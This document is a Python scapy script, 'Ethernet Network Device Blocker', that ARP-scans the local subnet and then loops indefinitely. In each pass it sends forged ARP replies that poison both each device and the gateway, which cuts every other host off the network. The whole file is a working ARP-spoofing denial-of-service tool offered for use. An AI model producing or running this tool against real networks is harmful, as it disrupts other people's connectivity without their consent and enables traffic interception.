#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from scapy.all import *
from mac_vendor_lookup import MacLookup
import time

INTERFACE = None

def get_active_interface():
    """List available interfaces and let user choose"""
    ifaces = get_if_list()
    print("Available interfaces:")
    for i, iface in enumerate(ifaces):
        try:
            ip_addr = get_if_addr(iface)
        except:
            ip_addr = "0.0.0.0"
        print(f"{i}. {iface} ({ip_addr})")
    try:
        choice = int(input("Select interface number: ").strip())
        return ifaces[choice]
    except (ValueError, IndexError):
        print("Invalid selection.")
        return None

def scan_network():
    """Scan the network and return a list of devices"""
    global INTERFACE
    if not INTERFACE:
        return []
    
    gateway_ip = conf.route.route("0.0.0.0")[2]
    ip_range = f"{gateway_ip}/24"

    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range),
        timeout=2,
        iface=INTERFACE,
        verbose=False
    )

    my_mac = get_if_hwaddr(INTERFACE)
    devices = []
    for _, rcv in ans:
        if rcv.hwsrc != my_mac:
            devices.append((rcv.psrc, rcv.hwsrc))
    return devices

def block_all_devices_forever():
    """Block all devices continuously, rescan network each loop"""
    gateway_ip = conf.route.route("0.0.0.0")[2]
    gateway_mac = getmacbyip(gateway_ip)
    if not gateway_mac:
        print("Could not get gateway MAC address!")
        return
    
    my_ip = get_if_addr(INTERFACE)

    print("[+] Blocking ALL devices on the network... Press CTRL+C to stop.")
    try:
        while True:
            devices = scan_network()
            devices_to_block = [(ip, mac) for ip, mac in devices if ip not in [my_ip, gateway_ip]]
            
            for ip, mac in devices_to_block:
                pkt_to_victim = Ether(dst=mac) / ARP(op=2, pdst=ip, psrc=gateway_ip, hwdst=mac)
                pkt_to_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip, psrc=ip, hwdst=gateway_mac)
                sendp(pkt_to_victim, iface=INTERFACE, verbose=False)
                sendp(pkt_to_gateway, iface=INTERFACE, verbose=False)
            
            time.sleep(0.2)  # سرعة التكرار
    except KeyboardInterrupt:
        print("\n[!] Stopped blocking all devices")

def main():
    print("Ethernet Network Device Blocker")
    print("="*40)

    global INTERFACE
    INTERFACE = get_active_interface()
    if not INTERFACE:
        print("No active interface found!")
        return

    block_all_devices_forever()

if __name__ == "__main__":
    main()
